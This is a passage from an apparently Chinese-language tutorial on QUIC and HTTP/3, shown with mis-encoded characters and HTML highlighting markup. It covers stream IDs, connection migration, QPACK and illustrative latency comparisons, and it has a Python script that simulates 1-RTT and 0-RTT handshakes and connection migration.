åŒå‘æµï¼šå¯ä»¥åŒå‘å‘é€æ•°æ®<br><br><span class="hljs-number">3.</span> æµçš„<span class="hljs-symbol">ID</span><br>   - å®¢æˆ·ç«¯å‘èµ·çš„åŒå‘æµï¼š<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12.</span>..<br>   - æœåŠ¡å™¨å‘èµ·çš„åŒå‘æµï¼š<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13.</span>..<br>   - å®¢æˆ·ç«¯å‘èµ·çš„å•å‘æµï¼š<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14.</span>..<br>   - æœåŠ¡å™¨å‘èµ·çš„å•å‘æµï¼š<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15.</span>..<br></code></pre></td></tr></table></figure><h3 id="2-5-è¿æ¥è¿ç§»"><a href="#2-5-è¿æ¥è¿ç§»" class="headerlink" title="2.5 è¿æ¥è¿ç§»"></a>2.5 è¿æ¥è¿ç§»</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QUICè¿æ¥è¿ç§»ï¼š<br><br>ä¼ ç»ŸTCPï¼š<br>WiFi:   192.168.1.100:5000 â†â†’ Server:443<br><span class="hljs-code">        â†“ (WiFi â†’ 4G)</span><br><span class="hljs-code">4G:     10.0.0.50:5000     â†â†’ Server:443</span><br><span class="hljs-code">        âŒ IPå˜åŒ–ï¼Œè¿æ¥æ–­å¼€ï¼Œéœ€è¦é‡æ–°å»ºç«‹</span><br><span class="hljs-code"></span><br>QUICï¼š<br>WiFi:   192.168.1.100:5000 â†â†’ Server:443<br><span class="hljs-code">        Connection ID: abc123</span><br><span class="hljs-code">        â†“ (WiFi â†’ 4G)</span><br><span class="hljs-code">4G:     10.0.0.50:5000     â†â†’ Server:443</span><br><span class="hljs-code">        Connection ID: abc123  âœ… ä»ç„¶æ˜¯åŒä¸€ä¸ªè¿æ¥ï¼</span><br><span class="hljs-code"></span><br>åŸç†ï¼š<br><span class="hljs-bullet">-</span> QUICä½¿ç”¨Connection IDæ ‡è¯†è¿æ¥<br><span class="hljs-bullet">-</span> Connection IDä¸ä¾èµ–äºIPåœ°å€å’Œç«¯å£<br><span class="hljs-bullet">-</span> ç½‘ç»œåˆ‡æ¢æ—¶ï¼Œåªéœ€è¦å‘é€æ–°çš„åŒ…<br><span class="hljs-bullet">-</span> æœåŠ¡å™¨è¯†åˆ«Connection IDï¼Œç»§ç»­åŸè¿æ¥<br><br>è¿ç§»è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯æ£€æµ‹åˆ°IPå˜åŒ–<br><span class="hljs-bullet">2.</span> ä½¿ç”¨æ–°IPå‘é€å¸¦æœ‰ç›¸åŒConnection IDçš„åŒ…<br><span class="hljs-bullet">3.</span> æœåŠ¡å™¨éªŒè¯Connection ID<br><span class="hljs-bullet">4.</span> æ›´æ–°è·¯å¾„ä¿¡æ¯ï¼Œç»§ç»­é€šä¿¡<br><span class="hljs-bullet">5.</span> æ— éœ€é‡æ–°æ¡æ‰‹ï¼<br><br>åº”ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> æ‰‹æœºWiFiåˆ‡æ¢åˆ°4G<br><span class="hljs-bullet">-</span> ç¬”è®°æœ¬ä»å®¶é‡Œç§»åŠ¨åˆ°å’–å•¡åº—<br><span class="hljs-bullet">-</span> è´Ÿè½½å‡è¡¡å™¨åˆ‡æ¢<br></code></pre></td></tr></table></figure><hr><h2 id="3-HTTP-3è¯¦è§£"><a href="#3-HTTP-3è¯¦è§£" class="headerlink" title="3. HTTP&#x2F;3è¯¦è§£"></a>3. HTTP&#x2F;3è¯¦è§£</h2><h3 id="3-1-HTTP-3æ¶æ„"><a href="#3-1-HTTP-3æ¶æ„" class="headerlink" title="3.1 HTTP&#x2F;3æ¶æ„"></a>3.1 HTTP&#x2F;3æ¶æ„</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-symbol">/3</span> <span class="hljs-operator">=</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">2</span>è¯­ä¹‰ <span class="hljs-operator">+</span> QUICä¼ è¾“<br><br>åè®®æ˜ å°„ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  HTTP<span class="hljs-symbol">/3</span>                                 â”‚<br>â”‚  <span class="hljs-operator">-</span> è¯·æ±‚<span class="hljs-operator">/</span>å“åº”æ¨¡å‹                         â”‚<br>â”‚  <span class="hljs-operator">-</span> å¤´éƒ¨å‹ç¼©ï¼ˆQPACKï¼‰                     â”‚<br>â”‚  <span class="hljs-operator">-</span> æœåŠ¡å™¨æ¨é€                            â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  QUIC                                   â”‚<br>â”‚  <span class="hljs-operator">-</span> æµï¼ˆStreamsï¼‰                         â”‚<br>â”‚  <span class="hljs-operator">-</span> è¿æ¥ç®¡ç†                              â”‚<br>â”‚  <span class="hljs-operator">-</span> å¯é ä¼ è¾“                              â”‚<br>â”‚  <span class="hljs-operator">-</span> åŠ å¯†ï¼ˆTLS <span class="hljs-number">1.3</span>ï¼‰                       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  UDP                                    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å¸§ç±»å‹ï¼ˆHTTP<span class="hljs-operator">/</span><span class="hljs-number">3</span>ç‰¹æœ‰ï¼‰ï¼š<br><span class="hljs-operator">-</span> <span class="hljs-params">DATA:</span> ä¼ è¾“HTTPæ¶ˆæ¯ä½“<br><span class="hljs-operator">-</span> <span class="hljs-params">HEADERS:</span> ä¼ è¾“HTTPå¤´éƒ¨ï¼ˆQPACKå‹ç¼©ï¼‰<br><span class="hljs-operator">-</span> <span class="hljs-params">SETTINGS:</span> è®¾ç½®å‚æ•°<br><span class="hljs-operator">-</span> <span class="hljs-params">PUSH_PROMISE:</span> æœåŠ¡å™¨æ¨é€<br><span class="hljs-operator">-</span> <span class="hljs-params">GOAWAY:</span> å…³é—­è¿æ¥<br><span class="hljs-operator">-</span> <span class="hljs-params">MAX_PUSH_ID:</span> é™åˆ¶æ¨é€ID<br><span class="hljs-operator">-</span> <span class="hljs-params">CANCEL_PUSH:</span> å–æ¶ˆæ¨é€<br></code></pre></td></tr></table></figure><h3 id="3-2-QPACKå¤´éƒ¨å‹ç¼©"><a href="#3-2-QPACKå¤´éƒ¨å‹ç¼©" class="headerlink" title="3.2 QPACKå¤´éƒ¨å‹ç¼©"></a>3.2 QPACKå¤´éƒ¨å‹ç¼©</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs markdown">QPACK vs HPACKï¼š<br><br>HPACKï¼ˆHTTP/2ï¼‰é—®é¢˜ï¼š<br><span class="hljs-bullet">-</span> åŠ¨æ€è¡¨éœ€è¦æŒ‰åºæ›´æ–°<br><span class="hljs-bullet">-</span> ä¸€ä¸ªæµçš„å¤´éƒ¨é˜»å¡ä¼šå½±å“å…¶ä»–æµ<br><br>QPACKæ”¹è¿›ï¼š<br><span class="hljs-bullet">-</span> å…è®¸ä¹±åºæ›´æ–°åŠ¨æ€è¡¨<br><span class="hljs-bullet">-</span> ä½¿ç”¨ä¸“ç”¨çš„ç¼–ç æµå’Œè§£ç æµ<br><span class="hljs-bullet">-</span> é¿å…é˜Ÿå¤´é˜»å¡<br><br>QPACKæ¶æ„ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ç¼–ç å™¨æµï¼ˆEncoder Streamï¼‰              â”‚<br>â”‚  - å‘é€åŠ¨æ€è¡¨æ›´æ–°                        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><span class="hljs-code">              â†“</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">â”‚  è¯·æ±‚æµï¼ˆRequest Streamsï¼‰               â”‚</span><br><span class="hljs-code">â”‚  - å¼•ç”¨åŠ¨æ€è¡¨                            â”‚</span><br><span class="hljs-code">â”‚  - å‘é€å‹ç¼©çš„å¤´éƒ¨                        â”‚</span><br><span class="hljs-code">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code">              â†“</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">â”‚  è§£ç å™¨æµï¼ˆDecoder Streamï¼‰              â”‚</span><br><span class="hljs-code">â”‚  - ç¡®è®¤åŠ¨æ€è¡¨æ›´æ–°                        â”‚</span><br><span class="hljs-code">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code"></span><br>å·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> ç¼–ç å™¨å‘é€åŠ¨æ€è¡¨æ’å…¥æŒ‡ä»¤<br><span class="hljs-bullet">2.</span> è¯·æ±‚æµå¼•ç”¨åŠ¨æ€è¡¨æ¡ç›®<br><span class="hljs-bullet">3.</span> è§£ç å™¨ç¡®è®¤æ”¶åˆ°æ’å…¥æŒ‡ä»¤<br><span class="hljs-bullet">4.</span> ç¼–ç å™¨å¯ä»¥å®‰å…¨åœ°é©±é€æ—§æ¡ç›®<br></code></pre></td></tr></table></figure><h3 id="3-3-HTTP-3æ€§èƒ½ä¼˜åŠ¿"><a href="#3-3-HTTP-3æ€§èƒ½ä¼˜åŠ¿" class="headerlink" title="3.3 HTTP&#x2F;3æ€§èƒ½ä¼˜åŠ¿"></a>3.3 HTTP&#x2F;3æ€§èƒ½ä¼˜åŠ¿</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">æ€§èƒ½å¯¹æ¯”ï¼š</span><br><br><span class="hljs-string">åœºæ™¯1ï¼šé¦–æ¬¡è®¿é—®ç½‘ç«™</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">TCPæ¡æ‰‹:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">TLSæ¡æ‰‹:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">HTTPè¯·æ±‚:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">150ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">QUICæ¡æ‰‹+è¯·æ±‚:</span> <span class="hljs-string">50ms</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">50ms</span>  <span class="hljs-string">âœ…</span> <span class="hljs-string">å¿«3å€</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">åœºæ™¯2ï¼šå¼±ç½‘ç¯å¢ƒï¼ˆä¸¢åŒ…ç‡5%ï¼‰</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">ä¸¢åŒ…å¯¼è‡´TCPé‡ä¼ </span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">æ‰€æœ‰æµè¢«é˜»å¡</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">1000ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">ä¸¢åŒ…åªå½±å“ç‰¹å®šæµ</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">å…¶ä»–æµç»§ç»­ä¼ è¾“</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">400ms</span>  <span class="hljs-string">âœ…</span> <span class="hljs-string">å¿«2.5å€</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">åœºæ™¯3ï¼šç§»åŠ¨ç½‘ç»œåˆ‡æ¢</span><br><span class="hljs-attr">HTTP/2:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">è¿æ¥æ–­å¼€</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">é‡æ–°å»ºç«‹è¿æ¥:</span> <span class="hljs-string">150ms</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">é‡æ–°è¯·æ±‚æ•°æ®</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">300ms</span><br><br><span class="hljs-attr">HTTP/3:</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">è¿æ¥è¿ç§»</span><br><span class="hljs-string">â”œâ”€</span> <span class="hljs-string">æ— éœ€é‡æ–°å»ºç«‹</span><br><span class="hljs-string">â””â”€</span> <span class="hljs-string">æ€»è®¡:</span> <span class="hljs-string">10ms</span>  <span class="hljs-string">âœ…</span> <span class="hljs-string">å¿«30å€</span><br></code></pre></td></tr></table></figure><hr><h2 id="4-å®æˆ˜é¡¹ç›®ï¼šHTTP-3æ¦‚å¿µæ¼”ç¤º"><a href="#4-å®æˆ˜é¡¹ç›®ï¼šHTTP-3æ¦‚å¿µæ¼”ç¤º" class="headerlink" title="4. å®æˆ˜é¡¹ç›®ï¼šHTTP&#x2F;3æ¦‚å¿µæ¼”ç¤º"></a>4. å®æˆ˜é¡¹ç›®ï¼šHTTP&#x2F;3æ¦‚å¿µæ¼”ç¤º</h2><h3 id="4-1-é¡¹ç›®è¯´æ˜"><a href="#4-1-é¡¹ç›®è¯´æ˜" class="headerlink" title="4.1 é¡¹ç›®è¯´æ˜"></a>4.1 é¡¹ç›®è¯´æ˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ³¨æ„ï¼šHTTP/3å®ç°éœ€è¦ä¸“é—¨çš„åº“æ”¯æŒ<br>æœ¬é¡¹ç›®å°†æ¼”ç¤ºæ ¸å¿ƒæ¦‚å¿µå’Œæ¨¡æ‹Ÿå®ç°<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-bullet">1.</span> QUICè¿æ¥å»ºç«‹æ¨¡æ‹Ÿ<br><span class="hljs-bullet">2.</span> 0-RTTæ¼”ç¤º<br><span class="hljs-bullet">3.</span> è¿æ¥è¿ç§»æ¼”ç¤º<br><span class="hljs-bullet">4.</span> æ€§èƒ½å¯¹æ¯”åˆ†æ<br></code></pre></td></tr></table></figure><h3 id="4-2-ä»£ç å®ç°"><a href="#4-2-ä»£ç å®ç°" class="headerlink" title="4.2 ä»£ç å®ç°"></a>4.2 ä»£ç å®ç°</h3><pre><code class="language-python"># day29_http3_demo.py# åŠŸèƒ½ï¼šHTTP/3å’ŒQUICåè®®æ¦‚å¿µæ¼”ç¤ºimport timeimport randomfrom typing import Dict, List, Tuplefrom enum import Enumclass PacketType(Enum):    &quot;&quot;&quot;QUICæ•°æ®åŒ…ç±»å‹&quot;&quot;&quot;    INITIAL = &quot;Initial&quot;    HANDSHAKE = &quot;Handshake&quot;    RETRY = &quot;Retry&quot;    ZERORTT = &quot;0-RTT&quot;    ONERTT = &quot;1-RTT&quot;class QUICPacket:    &quot;&quot;&quot;    QUICæ•°æ®åŒ…æ¨¡æ‹Ÿ    å±æ€§ï¼š        packet_type: æ•°æ®åŒ…ç±»å‹        connection_id: è¿æ¥ID        packet_number: åŒ…åºå·        payload: è´Ÿè½½æ•°æ®    &quot;&quot;&quot;    def __init__(self, packet_type: PacketType, connection_id: str,                 packet_number: int, payload: str = &quot;&quot;):        self.packet_type = packet_type        self.connection_id = connection_id        self.packet_number = packet_number        self.payload = payload        self.timestamp = time.time()    def __repr__(self):        return (f&quot;QUICPacket(type={self.packet_type.value}, &quot;                f&quot;conn_id={self.connection_id}, &quot;                f&quot;pkt_num={self.packet_number})&quot;)class QUICConnection:    &quot;&quot;&quot;    QUICè¿æ¥æ¨¡æ‹Ÿ    åŠŸèƒ½ï¼š        1. è¿æ¥å»ºç«‹ï¼ˆ1-RTTå’Œ0-RTTï¼‰        2. æ•°æ®ä¼ è¾“        3. è¿æ¥è¿ç§»    &quot;&quot;&quot;    def __init__(self, connection_id: str):        &quot;&quot;&quot;        åˆå§‹åŒ–QUICè¿æ¥        å‚æ•°ï¼š            connection_id: è¿æ¥æ ‡è¯†ç¬¦        &quot;&quot;&quot;        self.connection_id = connection_id        self.is_established = False        self.packet_number = 0        self.rtt = 50  # æ¨¡æ‹Ÿå¾€è¿”æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰        self.sent_packets = []        self.received_packets = []        self.session_ticket = None  # ç”¨äº0-RTT        self.client_ip = &quot;192.168.1.100&quot;        self.server_ip = &quot;93.184.216.34&quot;    def handshake_1rtt(self):        &quot;&quot;&quot;        1-RTTæ¡æ‰‹ï¼ˆé¦–æ¬¡è¿æ¥ï¼‰        å·¥ä½œæµç¨‹ï¼š            å®¢æˆ·ç«¯ â†’ Initial (Client Hello)            æœåŠ¡å™¨ â†’ Handshake (Server Hello, Certificate, Finished)            å®¢æˆ·ç«¯ â†’ Handshake (Finished) + 1-RTT (Application Data)        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUIC 1-RTTæ¡æ‰‹æ¼”ç¤º&quot;)        print(&quot;=&quot;*60)        print(f&quot;\nè¿æ¥ID: {self.connection_id}&quot;)        print(f&quot;å®¢æˆ·ç«¯: {self.client_ip}&quot;)        print(f&quot;æœåŠ¡å™¨: {self.server_ip}&quot;)        print(f&quot;RTT: {self.rtt}ms&quot;)        start_time = time.time()        # æ­¥éª¤1ï¼šå®¢æˆ·ç«¯å‘é€InitialåŒ…        print(&quot;\n[0ms] å®¢æˆ·ç«¯ â†’ Initial Packet&quot;)        initial_pkt = QUICPacket(            PacketType.INITIAL,            self.connection_id,            self.packet_number,            &quot;Client Hello + QUIC Parameters&quot;        )        self.sent_packets.append(initial_pkt)        self.packet_number += 1        print(f&quot;  å†…å®¹: {initial_pkt.payload}&quot;)        # æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ        time.sleep(self.rtt / 2000)  # RTTçš„ä¸€åŠ        # æ­¥éª¤2ï¼šæœåŠ¡å™¨å“åº”HandshakeåŒ…        print(f&quot;\n[{self.rtt//2}ms] æœåŠ¡å™¨ â†’ Handshake Packet&quot;)        handshake_pkt = QUICPacket(            PacketType.HANDSHAKE,            self.connection_id,            0,            &quot;Server Hello + Certificate + Finished&quot;        )        self.received_packets.append(handshake_pkt)        print(f&quot;  å†…å®¹: {handshake_pkt.payload}&quot;)        # æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ        time.sleep(self.rtt / 2000)        # æ­¥éª¤3ï¼šå®¢æˆ·ç«¯å‘é€Finishedå’Œåº”ç”¨æ•°æ®        print(f&quot;\n[{self.rtt}ms] å®¢æˆ·ç«¯ â†’ Handshake + 1-RTT Data&quot;)        finished_pkt = QUICPacket(            PacketType.HANDSHAKE,            self.connection_id,            self.packet_number,            &quot;Finished&quot;        )        self.sent_packets.append(finished_pkt)        self.packet_number += 1        print(f&quot;  æ¡æ‰‹å®Œæˆ&quot;)        data_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            self.packet_number,            &quot;HTTP/3 GET /index.html&quot;        )        self.sent_packets.append(data_pkt)        self.packet_number += 1        print(f&quot;  åº”ç”¨æ•°æ®: {data_pkt.payload}&quot;)        # è¿æ¥å»ºç«‹å®Œæˆ        self.is_established = True        # ä¿å­˜ä¼šè¯ç¥¨æ®ç”¨äº0-RTT        self.session_ticket = f&quot;ticket_{self.connection_id}_{int(time.time())}&quot;        elapsed = (time.time() - start_time) * 1000        print(f&quot;\nâœ… è¿æ¥å»ºç«‹å®Œæˆï¼&quot;)        print(f&quot;æ€»è€—æ—¶: {elapsed:.2f}ms (çº¦1-RTT)&quot;)        print(f&quot;ä¼šè¯ç¥¨æ®: {self.session_ticket}&quot;)        return elapsed    def handshake_0rtt(self):        &quot;&quot;&quot;        0-RTTæ¡æ‰‹ï¼ˆå†æ¬¡è¿æ¥ï¼‰        å·¥ä½œåŸç†ï¼š            å®¢æˆ·ç«¯ä½¿ç”¨ä¹‹å‰ä¿å­˜çš„ä¼šè¯ç¥¨æ®å’Œå¯†é’¥            å¯ä»¥åœ¨ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ä¸­å°±å‘é€åº”ç”¨æ•°æ®        &quot;&quot;&quot;        if not self.session_ticket:            print(&quot;âŒ æ²¡æœ‰ä¼šè¯ç¥¨æ®ï¼Œæ— æ³•ä½¿ç”¨0-RTT&quot;)            return None        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUIC 0-RTTæ¡æ‰‹æ¼”ç¤º&quot;)        print(&quot;=&quot;*60)        print(f&quot;\nè¿æ¥ID: {self.connection_id}&quot;)        print(f&quot;ä¼šè¯ç¥¨æ®: {self.session_ticket}&quot;)        print(&quot;ä½¿ç”¨ä¹‹å‰ä¿å­˜çš„å¯†é’¥&quot;)        start_time = time.time()        # æ­¥éª¤1ï¼šå®¢æˆ·ç«¯ç›´æ¥å‘é€åº”ç”¨æ•°æ®        print(&quot;\n[0ms] å®¢æˆ·ç«¯ â†’ Initial + 0-RTT Data&quot;)        initial_pkt = QUICPacket(            PacketType.ZERORTT,            self.connection_id,            self.packet_number,            &quot;HTTP/3 GET /style.css&quot;        )        self.sent_packets.append(initial_pkt)        self.packet_number += 1        print(f&quot;  ä¼šè¯ç¥¨æ®: {self.session_ticket}&quot;)        print(f&quot;  åº”ç”¨æ•°æ®: {initial_pkt.payload}&quot;)        elapsed = (time.time() - start_time) * 1000        print(f&quot;\nâœ… 0-RTTå‘é€å®Œæˆï¼æ— éœ€ç­‰å¾…æ¡æ‰‹ï¼&quot;)        print(f&quot;æ€»è€—æ—¶: {elapsed:.2f}ms (0-RTT)&quot;)        return elapsed    def migrate_connection(self, new_ip: str):        &quot;&quot;&quot;        è¿æ¥è¿ç§»æ¼”ç¤º        å‚æ•°ï¼š            new_ip: æ–°çš„IPåœ°å€        å·¥ä½œåŸç†ï¼š            ä½¿ç”¨Connection IDæ ‡è¯†è¿æ¥            IPå˜åŒ–ä¸å½±å“è¿æ¥çŠ¶æ€        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; QUICè¿æ¥è¿ç§»æ¼”ç¤º&quot;)        print(&quot;=&quot;*60)        old_ip = self.client_ip        print(f&quot;\nç½‘ç»œåˆ‡æ¢æ£€æµ‹:&quot;)        print(f&quot;  æ—§IP: {old_ip} (WiFi)&quot;)        print(f&quot;  æ–°IP: {new_ip} (4G)&quot;)        print(f&quot;  è¿æ¥ID: {self.connection_id}&quot;)        start_time = time.time()        # æ›´æ–°IP        self.client_ip = new_ip        # ä½¿ç”¨æ–°IPå‘é€æ•°æ®åŒ…        print(f&quot;\nä½¿ç”¨æ–°IPå‘é€æ•°æ®åŒ…...&quot;)        migration_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,  # Connection IDä¸å˜            self.packet_number,            &quot;Path Challenge&quot;        )        self.sent_packets.append(migration_pkt)        self.packet_number += 1        # æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ        time.sleep(self.rtt / 1000)        print(f&quot;  æœåŠ¡å™¨è¯†åˆ«Connection ID: {self.connection_id}&quot;)        print(f&quot;  æ›´æ–°è·¯å¾„: {old_ip} â†’ {new_ip}&quot;)        print(f&quot;  éªŒè¯æ–°è·¯å¾„...&quot;)        response_pkt = QUICPacket(            PacketType.ONERTT,            self.connection_id,            0,            &quot;Path 